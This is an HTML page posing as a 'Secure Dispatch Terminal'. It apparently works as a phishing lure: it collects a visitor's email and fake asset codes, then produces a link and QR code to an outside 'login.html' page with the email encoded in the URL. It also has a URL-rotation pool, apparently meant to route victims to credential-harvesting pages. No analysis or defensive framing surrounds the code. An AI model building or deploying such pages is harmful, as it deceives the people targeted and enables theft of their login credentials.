<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Dispatch Terminal</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
        :root { --primary: #0ea5e9; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --dim: #94a3b8; --error: #f43f5e; --success: #10b981; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: radial-gradient(circle at top right, #1e293b, #0f172a); color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .portal { width: 100%; max-width: 500px; background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(10px); border-radius: 20px; overflow: hidden; border: 1px solid #334155; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .header { background: linear-gradient(90deg, var(--primary), #3b82f6); padding: 20px; text-align: center; font-weight: 800; font-size: 1.2rem; letter-spacing: 1px; }
        .tabs { display: flex; background: var(--card); border-bottom: 1px solid #334155; }
        .tab { flex: 1; padding: 15px; text-align: center; font-size: 0.8rem; font-weight: 600; color: var(--dim); cursor: pointer; text-transform: uppercase; }
        .tab.active { color: var(--primary); background: var(--bg); box-shadow: inset 0 -2px 0 var(--primary); }
        .tab.locked { opacity: 0.3; cursor: not-allowed; }
        .content { padding: 30px; min-height: 380px; }
        .section { display: none; animation: fadeIn 0.3s ease; }
        .section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        label { display: block; margin-bottom: 8px; font-size: 0.75rem; font-weight: 600; color: var(--primary); text-transform: uppercase; }
        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; margin-bottom: 15px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; transition: 0.2s; }
        .err { color: var(--error); font-size: 0.8rem; margin-bottom: 15px; display: none; }
        .info-card { background: var(--card); padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #334155; font-size: 0.9rem; }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .qr-box { background: white; padding: 10px; border-radius: 10px; display: inline-block; margin: 15px 0; }
        .btn-success { background: var(--success); text-decoration: none; display: block; text-align: center; color: white; padding: 15px; border-radius: 8px; font-weight: 700; }
    </style>
</head>
<body>
<div class="portal">
    <div class="header">SECURE DISPATCH TERMINAL</div>
    <div class="tabs"><div class="tab active" id="t1">Verify</div><div class="tab locked" id="t2">Secured</div></div>
    <div class="content">
        <div id="s1" class="section active">
            <label>Receiver Email</label>
            <input type="email" id="email" placeholder="e.g. user@company.com">
            <label>Confirmation Code</label>
            <input type="text" id="code" placeholder="CONF-00000000000/000">
            <label>Serial Number</label>
            <input type="text" id="sn" placeholder="SN-000000000/000">
            <div id="err" class="err">Invalid inputs. Check format (CONF-X/SN-X) and email.</div>
            <button onclick="validate()">Validate Asset</button>
        </div>
        <div id="s2" class="section" style="text-align: center;">
            <div class="info-card">
                <div class="info-row"><span style="color:var(--dim)">Target:</span> <span id="d-email"></span></div>
                <div class="info-row"><span style="color:var(--dim)">Asset ID:</span> <span id="d-code"></span></div>
            </div>
            <div class="qr-box"><div id="qrcode"></div></div>
            <a href="#" id="next-link" class="btn-success">Open Secure Log →</a>
        </div>
    </div>
</div>
<script>
    const URL_POOL = [
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html",
        "https://persone-portfolioinc.github.io/servicedel/login.html"
    ];

    const CONFIG = {
        cRegex: /^CONF-\d{11}\/\d{3}$/,
        sRegex: /^SN-\d{9}\/\d{3}$/
    };

    function validate() {
        const email = document.getElementById('email').value.trim();
        const code = document.getElementById('code').value.trim();
        const sn = document.getElementById('sn').value.trim();
        
        if (!email.includes('@') || !CONFIG.cRegex.test(code) || !CONFIG.sRegex.test(sn)) {
            document.getElementById('err').style.display = 'block';
            return;
        }

        document.getElementById('d-email').textContent = email;
        document.getElementById('d-code').textContent = code;
        
        // --- RANDOM URL LOGIC ---
        const randomBase = URL_POOL[Math.floor(Math.random() * URL_POOL.length)];
        const target = `${randomBase}?u=${btoa(email)}&ref=${Date.now()}`;
        // ------------------------

        document.getElementById('next-link').href = target;
        document.getElementById('qrcode').innerHTML = "";
        new QRCode(document.getElementById("qrcode"), { text: target, width: 120, height: 120 });

        document.getElementById('t2').classList.remove('locked');
        document.getElementById('s1').classList.remove('active');
        document.getElementById('s2').classList.add('active');
        document.getElementById('t1').classList.remove('active');
        document.getElementById('t2').classList.add('active');
    }
</script>
</body>
</html>
